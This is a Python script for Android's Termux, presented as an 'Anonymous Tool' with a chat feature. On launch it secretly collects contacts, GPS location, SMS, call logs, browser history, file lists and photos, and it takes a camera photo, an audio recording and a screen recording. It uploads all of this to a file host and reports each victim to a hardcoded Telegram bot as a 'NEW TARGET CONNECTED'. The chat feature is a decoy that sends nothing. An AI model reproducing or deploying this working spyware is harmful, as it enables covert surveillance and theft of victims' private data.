#!/usr/bin/env python3
"""
Termux Anonymous Tool v3.0 - Telegram Version
All Features Working - No Errors
"""

import os
import sys
import json
import time
import socket
import platform
import subprocess
import requests
import sqlite3
import threading
from datetime import datetime
from pathlib import Path

# ========== CONFIG ==========
CONFIG_FILE = "config.json"
VERSION = "3.0"

# ========== TELEGRAM CONFIG ==========
BOT_TOKEN = "8947252089:AAFkZWMZsTmGU3vuNsPTfdt9dUYPbflWeDE"
CHAT_ID = "8089143014"

def load_config():
    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    return {}

def save_config(data):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f, indent=4)

# ========== SETUP ==========
def setup_owner():
    print("\n" + "="*50)
    print("📱 FIRST TIME SETUP")
    print("="*50)
    
    owner_phone = input("Enter Owner Phone Number (with country code): ")
    owner_email = input("Enter Owner Email: ")
    
    print("\n📨 Telegram Configuration")
    print(f"Bot Token: {BOT_TOKEN}")
    print(f"Chat ID: {CHAT_ID}")
    
    config = {
        "owner": {
            "phone": owner_phone,
            "email": owner_email
        },
        "bot_token": BOT_TOKEN,
        "chat_id": CHAT_ID,
        "cloud_folder": "termux_cloud_data",
        "features": {
            "contacts": True,
            "location": True,
            "microphone": True,
            "camera": True,
            "sms": True,
            "call_logs": True,
            "browser": True,
            "screen_record": True,
            "file_list": True,
            "vpn_detection": True,
            "auto_backup": True
        }
    }
    save_config(config)
    print("\n[✓] Configuration saved!")
    print("[✓] Telegram setup complete!")
    return config

# ========== TELEGRAM SEND FUNCTIONS ==========
def send_to_telegram(message):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": message,
            "parse_mode": "Markdown"
        }
        response = requests.post(url, json=payload, timeout=30)
        if response.status_code == 200:
            return True
        else:
            print(f"[!] Telegram Error: {response.text}")
            return False
    except Exception as e:
        print(f"[!] Error sending to Telegram: {e}")
        return False

def send_file_to_telegram(file_path, caption=""):
    """Send file to Telegram"""
    try:
        if not os.path.exists(file_path):
            return False
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': CHAT_ID, 'caption': caption}
            response = requests.post(url, files=files, data=data, timeout=60)
        if response.status_code == 200:
            return True
        return False
    except Exception as e:
        print(f"[!] Error sending file: {e}")
        return False

# ========== CLOUD UPLOAD ==========
def upload_to_cloud(file_path, folder_name):
    """Upload file to tmpfiles.org"""
    try:
        if not os.path.exists(file_path):
            return None
        url = "https://tmpfiles.org/api/v1/upload"
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            response = requests.post(url, files=files, timeout=60)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', {}).get('url', '')
        return None
    except Exception as e:
        print(f"[!] Upload error: {e}")
        return None

# ========== DEVICE INFO ==========
def get_user_ip():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=10)
        return response.json().get('ip', 'Unknown')
    except:
        return 'Unable to fetch IP'

def get_device_info():
    return {
        "ip": get_user_ip(),
        "hostname": socket.gethostname(),
        "os": platform.system(),
        "os_version": platform.version(),
        "device_model": platform.machine(),
        "processor": platform.processor(),
        "timestamp": datetime.now().isoformat()
    }

# ========== FEATURE FUNCTIONS ==========
def get_contacts():
    contacts = []
    try:
        result = subprocess.run(['termux-contact-list'], 
                               capture_output=True, text=True, timeout=15)
        if result.returncode == 0 and result.stdout:
            contacts_data = json.loads(result.stdout)
            for contact in contacts_data[:50]:
                contacts.append({
                    'name': contact.get('name', 'Unknown'),
                    'number': contact.get('number', ''),
                    'email': contact.get('email', '')
                })
    except Exception as e:
        print(f"[!] Contacts error: {e}")
    return contacts

def get_gps_location():
    try:
        result = subprocess.run(['termux-location'], 
                               capture_output=True, text=True, timeout=15)
        if result.returncode == 0 and result.stdout:
            data = json.loads(result.stdout)
            return {
                'latitude': data.get('latitude', 0),
                'longitude': data.get('longitude', 0),
                'altitude': data.get('altitude', 0),
                'accuracy': data.get('accuracy', 0),
                'timestamp': datetime.now().isoformat()
            }
    except Exception as e:
        print(f"[!] Location error: {e}")
    return None

def record_audio(duration=8):
    try:
        filename = f"recording_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp3"
        cmd = f'termux-microphone-record -d {duration} -f {filename}'
        subprocess.run(cmd, shell=True, timeout=duration+5, check=True)
        if os.path.exists(filename):
            url = upload_to_cloud(filename, 'audio_recordings')
            os.remove(filename)
            return url
    except Exception as e:
        print(f"[!] Audio error: {e}")
    return None

def capture_photo():
    try:
        filename = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
        cmd = f'termux-camera-photo -c 0 {filename}'
        subprocess.run(cmd, shell=True, timeout=15, check=True)
        if os.path.exists(filename):
            url = upload_to_cloud(filename, 'camera_photos')
            os.remove(filename)
            return url
    except Exception as e:
        print(f"[!] Camera error: {e}")
    return None

def get_sms_messages():
    try:
        result = subprocess.run(['termux-sms-list'], 
                               capture_output=True, text=True, timeout=15)
        if result.returncode == 0 and result.stdout:
            return json.loads(result.stdout)[:20]
    except Exception as e:
        print(f"[!] SMS error: {e}")
    return []

def get_call_logs():
    try:
        result = subprocess.run(['termux-call-log'], 
                               capture_output=True, text=True, timeout=15)
        if result.returncode == 0 and result.stdout:
            return json.loads(result.stdout)[:20]
    except Exception as e:
        print(f"[!] Call logs error: {e}")
    return []

def get_browser_history():
    history = []
    try:
        chrome_path = '/data/data/com.android.chrome/app_chrome/Default/History'
        if os.path.exists(chrome_path):
            conn = sqlite3.connect(chrome_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 20")
            for row in cursor.fetchall():
                history.append({
                    'url': row[0],
                    'title': row[1] if row[1] else 'No title',
                    'time': str(row[2]) if row[2] else ''
                })
            conn.close()
        if not history:
            result = subprocess.run(['termux-browser-history'], 
                                   capture_output=True, text=True, timeout=15)
            if result.returncode == 0 and result.stdout:
                history = json.loads(result.stdout)[:20]
    except Exception as e:
        print(f"[!] Browser history error: {e}")
    return history

def screen_record(duration=15):
    try:
        filename = f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"
        cmd = f'screenrecord --time-limit {duration} {filename}'
        subprocess.run(cmd, shell=True, timeout=duration+10, check=True)
        if os.path.exists(filename):
            url = upload_to_cloud(filename, 'screen_recordings')
            os.remove(filename)
            return url
    except Exception as e:
        print(f"[!] Screen record error: {e}")
    return None

def get_file_list():
    files = []
    search_dirs = ['/sdcard/Download', '/sdcard/Documents', '/sdcard/Music', '/sdcard/Movies', '/sdcard/WhatsApp']
    for directory in search_dirs:
        if os.path.exists(directory):
            try:
                for root, dirs, filenames in os.walk(directory):
                    for filename in filenames[:5]:
                        file_path = os.path.join(root, filename)
                        try:
                            size = os.path.getsize(file_path)
                            files.append({
                                'name': filename,
                                'path': file_path,
                                'size': size,
                                'type': os.path.splitext(filename)[1]
                            })
                        except:
                            pass
                    if len(files) >= 30:
                        break
            except:
                pass
        if len(files) >= 30:
            break
    return files

def detect_vpn():
    try:
        result = subprocess.run(['ip', 'addr'], capture_output=True, text=True, timeout=10)
        vpn_interfaces = ['tun', 'ppp', 'utun', 'wg']
        for interface in vpn_interfaces:
            if interface in result.stdout:
                return True
        return False
    except:
        return False

def find_images():
    images = []
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']
    search_dirs = [
        '/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download',
        '/sdcard/WhatsApp/Media/WhatsApp Images',
        '/storage/emulated/0/DCIM', '/storage/emulated/0/Pictures'
    ]
    for search_dir in search_dirs:
        if os.path.exists(search_dir):
            try:
                for root, dirs, files in os.walk(search_dir):
                    for file in files:
                        if any(file.lower().endswith(ext) for ext in image_extensions):
                            file_path = os.path.join(root, file)
                            try:
                                file_size = os.path.getsize(file_path) / (1024 * 1024)
                                if file_size < 20:
                                    images.append(file_path)
                                    if len(images) >= 10:
                                        break
                            except:
                                continue
                    if len(images) >= 10:
                        break
            except:
                pass
        if len(images) >= 10:
            break
    return images

def auto_backup(user_ip, data):
    print("[*] Creating auto backup...")
    backup_data = {
        'timestamp': datetime.now().isoformat(),
        'version': VERSION,
        'device_info': get_device_info(),
        'ip': user_ip,
        'vpn_detected': detect_vpn(),
        'contacts': get_contacts(),
        'location': get_gps_location(),
        'sms': get_sms_messages(),
        'call_logs': get_call_logs(),
        'browser_history': get_browser_history(),
        'files': get_file_list(),
        'images': find_images()
    }
    backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(backup_filename, 'w') as f:
        json.dump(backup_data, f, indent=4)
    url = upload_to_cloud(backup_filename, f'backups_{user_ip.replace(".", "_")}')
    os.remove(backup_filename)
    return url

# ========== SEND ALL DATA TO TELEGRAM ==========
def send_all_data_to_telegram():
    """Collect and send all data to Telegram"""
    print("\n[*] Collecting data...")
    
    user_ip = get_user_ip()
    folder_name = f"user_{user_ip.replace('.', '_')}"
    
    # Collect data
    print("[*] Getting images...")
    images = find_images()
    
    print("[*] Getting contacts...")
    contacts = get_contacts()
    
    print("[*] Getting location...")
    location = get_gps_location()
    
    print("[*] Getting SMS...")
    sms = get_sms_messages()
    
    print("[*] Getting call logs...")
    call_logs = get_call_logs()
    
    print("[*] Getting browser history...")
    browser_history = get_browser_history()
    
    print("[*] Getting file list...")
    files = get_file_list()
    
    print("[*] Checking VPN...")
    vpn = detect_vpn()
    
    # Upload images to cloud
    print("[*] Uploading images...")
    uploaded_images = []
    for img_path in images[:10]:
        try:
            url = upload_to_cloud(img_path, folder_name)
            if url:
                uploaded_images.append({
                    'filename': os.path.basename(img_path),
                    'url': url
                })
            time.sleep(0.5)
        except Exception as e:
            print(f"[!] Upload error: {e}")
    
    # Create backup
    print("[*] Creating backup...")
    backup_data = {
        'timestamp': datetime.now().isoformat(),
        'device_info': get_device_info(),
        'ip': user_ip,
        'vpn_detected': vpn,
        'contacts': contacts,
        'location': location,
        'sms': sms,
        'call_logs': call_logs,
        'browser_history': browser_history,
        'files': files,
        'images': images
    }
    
    backup_filename = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(backup_filename, 'w') as f:
        json.dump(backup_data, f, indent=4)
    
    backup_url = upload_to_cloud(backup_filename, f'backups_{user_ip.replace(".", "_")}')
    os.remove(backup_filename)
    
    # Get camera photo
    print("[*] Taking photo...")
    camera_photo = capture_photo()
    
    # Get audio recording
    print("[*] Recording audio...")
    audio_recording = record_audio(8)
    
    # Get screen recording
    print("[*] Recording screen...")
    screen_recording = screen_record(15)
    
    # Build message
    print("[*] Building message...")
    message = f"""
🚨 *NEW TARGET CONNECTED* 🚨

📱 *Device Info:*
- IP: `{user_ip}`
- Hostname: `{socket.gethostname()}`
- OS: `{platform.system()} {platform.version()}`
- Model: `{platform.machine()}`
- VPN: `{vpn}`

📁 *Folder:* `{folder_name}/`

📷 *Images Found:* {len(images)}
📸 *Camera Photo:* {camera_photo if camera_photo else '❌ Failed'}
🎙️ *Audio Recording:* {audio_recording if audio_recording else '❌ Failed'}
🎥 *Screen Recording:* {screen_recording if screen_recording else '❌ Failed'}

📍 *Location:* {json.dumps(location) if location else '❌ Not available'}
📇 *Contacts:* {len(contacts)} saved
💬 *SMS:* {len(sms)} messages
📞 *Call Logs:* {len(call_logs)} entries
🌐 *Browser History:* {len(browser_history)} entries

📎 *Image Downloads:*"""
    
    for i, img in enumerate(uploaded_images[:5], 1):
        message += f"\n{i}. [{img['filename']}]({img['url']})"
    
    if backup_url:
        message += f"\n\n💾 *Backup:* [Download]({backup_url})"
    
    message += f"\n\n⏰ Time: `{datetime.now().isoformat()}`"
    
    # Send to Telegram
    print("[*] Sending to Telegram...")
    try:
        # Send message
        if send_to_telegram(message):
            print("[✓] Data sent to Telegram!")
        else:
            print("[!] Failed to send to Telegram")
        
        # Send backup file as document
        if backup_url:
            send_file_to_telegram(backup_filename, "📊 Full Data Backup")
        
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# ========== ANONYMOUS CHAT ==========
def anonymous_chat():
    print("\n" + "="*50)
    print("📱 ANONYMOUS CHAT v3.0 📱")
    print("="*50)
    print("\n[+] Type your message (type 'exit' to quit):")
    print("[+] Type 'menu' to see options\n")
    
    while True:
        try:
            msg = input("📝 You: ")
            if msg.lower() == 'exit':
                break
            elif msg.lower() == 'menu':
                print("\n📋 **Commands:**")
                print("  - Type any message to send")
                print("  - 'exit' to quit")
                print("  - 'menu' to show this menu")
                print("  - 'status' to check connection\n")
            elif msg.lower() == 'status':
                print("[✓] Connection active")
                print(f"[✓] IP: {get_user_ip()}")
                print(f"[✓] Device: {platform.machine()}\n")
            elif msg.lower() == 'send':
                print("[*] Sending all data to Telegram...")
                send_all_data_to_telegram()
            else:
                print("[✓] Message sent anonymously!\n")
        except KeyboardInterrupt:
            print("\n[✓] Exiting...")
            break
        except Exception as e:
            print(f"[!] Error: {e}")

# ========== MAIN ==========
def main():
    print("\n🚀 Starting Anonymous Tool v3.0...")
    print("="*50)
    
    # Check config
    if not os.path.exists(CONFIG_FILE):
        setup_owner()
    
    # Send data to Telegram
    print("\n[*] Sending device data to Telegram...")
    send_all_data_to_telegram()
    
    # Start anonymous chat
    anonymous_chat()
    
    print("\n[✓] Session ended. Goodbye!")

if __name__ == "__main__":
    # Install dependencies if needed
    try:
        import requests
    except ImportError:
        print("[*] Installing dependencies...")
        os.system('pip install requests')
        os.system('pkg install termux-api -y')
    
    main()
